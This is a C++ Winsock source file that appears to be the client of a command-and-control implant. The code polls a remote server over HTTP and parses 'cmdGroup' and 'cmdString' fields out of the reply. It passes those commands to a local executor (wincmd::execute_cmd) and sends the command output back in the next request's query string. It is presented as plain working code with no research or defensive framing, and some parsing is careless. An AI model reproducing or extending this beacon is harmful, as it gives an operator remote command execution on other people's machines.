#include <iostream>
#include <string>
#include <sstream>
#include <ws2tcpip.h>
#include "xhttp.h"
#include <WinSock2.h>
#include <map>
#include <cstring>
#include <cstdint>
#include <stdint.h>
#include <algorithm>
#include "command.h"

#pragma comment(lib, "ws2_32.lib")

namespace xhttp {
std::vector<uint32_t> req_body;
std::string cmdstr;
std::string cmdString;
std::string cmdGroup;
std::string cmdValue;
CommandQueue queue;
int key;
std::string cmdResponse;

bool parse_url(const std::string& url, std::string& protocol, std::string& host, int& port, std::string& path) {
    std::stringstream ss(url);
    std::string temp;

    // Parse protocol
    getline(ss, protocol, ':');
    if (protocol != "http") {
        std::cerr << "Invalid protocol. Only 'http' protocol is supported." << std::endl;
        return false;
    }
    // Check if there are more characters in the stringstream
    if (ss.peek() == EOF) {
        std::cerr << "Unexpected end of URL." << std::endl;
        return false;
    }
    // Consume "//"
    getline(ss, temp, '/');
    getline(ss, temp, '/');

    // Parse host and port
    getline(ss, host, ':');
    if (host.empty()) {
        std::cerr << "Invalid URL format. Hostname is missing." << std::endl;
        return false;
    }
    std::string port_str;
    getline(ss, port_str, '/');
    if (port_str.empty()) {
        std::cerr << "Invalid URL format. Port number is missing." << std::endl;
        return false;
    }
    port = stoi(port_str);
    // Parse path
    getline(ss, path);
    if (path.empty()) {
        std::cerr << "Invalid URL format. Path is missing." << std::endl;
        return false;
    }
    return true;
}

std::string createCookiesString() {
    // Define the cookies string with dynamic ID
    std::string cookies = "ID=value1; cookie2=value2"; // separate cookies with semicolon

    return cookies;
}

std::string buildRequest(const std::string& path, const std::string& host, const std::string& cookies, CommandQueue& queue) {
    // Check if the queue is not empty
    if (!queue.empty()) {
        // Access the first element in the map
        auto it = queue.begin();
        // Access the command info
        auto& cmdqueue = it->second;
        // Access cmdValue, cmdString, cmdResponse
        std::string cmdGroup = cmdqueue.cmdGroup;
        std::string cmdString = cmdqueue.cmdString;
        std::string cmdResponse = cmdqueue.cmdResponse;

        std::string cookiesString = createCookiesString(); // Assuming this function is defined
        std::string queryParams = "cmdValue=" + cmdGroup + "&cmdString=" + cmdString + "&cmdResponse=" + cmdResponse;

        std::cout << "Params: " << queryParams << std::endl;

        return "GET /" + path + "?" + queryParams + " HTTP/1.1\r\n"
               "Host: " + host + "\r\n"
               "Connection: Keep-Alive\r\n"
               "Keep-Alive: timeout=15, max=1000\r\n" // add \r\n at the end
               "Cookie: " + cookiesString + "\r\n"    // add \r\n at the end
               "\r\n";
        
    } else {
        // Queue is empty, return request without command information
        std::cout << "Empty queue" << std::endl;
        std::string cookiesString = createCookiesString(); // Assuming this function is defined
        return "GET /" + path + "?" + " HTTP/1.1\r\n"
               "Host: " + host + "\r\n"
               "Connection: Keep-Alive\r\n"
               "Keep-Alive: timeout=15, max=1000\r\n" // add \r\n at the end
               "Cookie: " + cookiesString + "\r\n"    // add \r\n at the end
               "\r\n";
    }
}

bool initialize_winsock() {
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2, 2), &wsaData) == 0;
}

SOCKET create_socket(const std::string& host, int port) {
    SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        std::cerr << "Error creating socket: " << WSAGetLastError() << std::endl;
        return INVALID_SOCKET;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(host.c_str());
    serverAddr.sin_port = htons(port);

    if (connect(ConnectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Error connecting to server: " << WSAGetLastError() << std::endl;
        closesocket(ConnectSocket);
        return INVALID_SOCKET;
    }

    return ConnectSocket;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////                                       GET  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

std::string http_get(const std::string& url) {
    std::string protocol, host, path, cookies;
    int port;
    if (!parse_url(url, protocol, host, port, path)) {
        return "";
    }

    if (!initialize_winsock()) {
        return "";
    }

    SOCKET ConnectSocket = create_socket(host, port);
    if (ConnectSocket == INVALID_SOCKET) {
        WSACleanup();
        return "";
    }

    std::string request = buildRequest(path, host, cookies, queue);

    if (send(ConnectSocket, request.c_str(), request.length(), 0) == SOCKET_ERROR) {
        std::cerr << "Error sending request: " << WSAGetLastError() << std::endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return "";
    }

    std::vector<char> response_data = receive_data(ConnectSocket);
// Print response
/*
    for (const auto& data : response_data) {
        char character = static_cast<char>(data); // Convert ASCII value to char
        std::cerr << character;
    }
    std::cerr << std::endl;
*/

    std::string cmdValue = extractCMD(response_data);
    req_body.clear();

    closesocket(ConnectSocket);
    WSACleanup();
    return ""; 
}

std::string extractCMD(const std::vector<char>& data) {
    const char cmdHeader[] = "cmdGroup:";
    auto header_start = std::search(data.begin(), data.end(), std::begin(cmdHeader), std::end(cmdHeader) - 1);
    auto header_end = std::find(header_start, data.end(), '\n');
    const char cmda[] = "cmdString:";
    auto argstart = std::search(data.begin(), data.end(), std::begin(cmda), std::end(cmda) - 1);
    auto argend = std::find(argstart, data.end(), '\n');
    
    cmdGroup.assign(header_start + sizeof(cmdHeader) - 1, header_end);
    cmdString.assign(argstart + sizeof(cmda) - 1, argend);
    
    return cmdValue;
}

void addToQueue(CommandQueue& queue, int key, const std::string& cmdValue, const std::string& cmdString, const std::string& cmdResponse) {
    Command command;
    command.cmdGroup = cmdValue;
    command.cmdString = cmdString;
    command.cmdResponse = cmdResponse;
    queue[key] = command;  // Add command to the queue with the specified key
}

void removeFromQueue(CommandQueue& queue, int key) {
    queue.erase(key);  // Remove command from the queue with the specified key
}

bool extract_content_length(const std::vector<char>& data, size_t& content_length) {
    // Search for the Content-Length header
    const std::string content_length_header = "Content-Length:";
    auto header_start = std::search(data.begin(), data.end(), content_length_header.begin(), content_length_header.end());
    if (header_start != data.end()) {
        // Find the end of the header line
        auto header_end = std::find(header_start, data.end(), '\n');
        if (header_end != data.end()) {
            // Extract the content length value
            std::string length_str(header_start + content_length_header.size(), header_end);
            content_length = std::stoul(length_str);
            return true;
        }
    }
    return false;
}

std::vector<char> receive_data(SOCKET ConnectSocket) {
    constexpr size_t BUFFER_SIZE = 2048;
    std::vector<char> buffer;
    int totalBytesReceived = 0;
    int bytesReceived;

    size_t content_length = 0;
    bool found_content_length = false;

    do {
        char chunkBuffer[BUFFER_SIZE];
        bytesReceived = recv(ConnectSocket, chunkBuffer, BUFFER_SIZE, 0);
        if (bytesReceived > 0) {
            buffer.insert(buffer.end(), chunkBuffer, chunkBuffer + bytesReceived);
            totalBytesReceived += bytesReceived;

            // Check if we have found the Content-Length header
            if (!found_content_length) {
                // Convert buffer to string to search for Content-Length
                std::string str(buffer.begin(), buffer.end());
                found_content_length = extract_content_length(buffer, content_length);
            }

            // Check if we have received the entire body
            if (found_content_length && totalBytesReceived >= content_length) {
                break;
            }
        } else if (bytesReceived == 0) {
            // Connection closed by the server
            break;
        } else {
            std::cerr << "recv failed\n";
            closesocket(ConnectSocket);
            WSACleanup();
            return std::vector<char>();
        }
    } while (bytesReceived == BUFFER_SIZE);

    if (!cmdString.empty()) {
        addToQueue(queue, key, cmdGroup, cmdString, cmdResponse);
        wincmd::execute_cmd(queue, wincmd::current_dir, wincmd::time_out);  
    } else {
        std::cerr << "Received empty command" << std::endl;
    }

    return buffer;
}

}
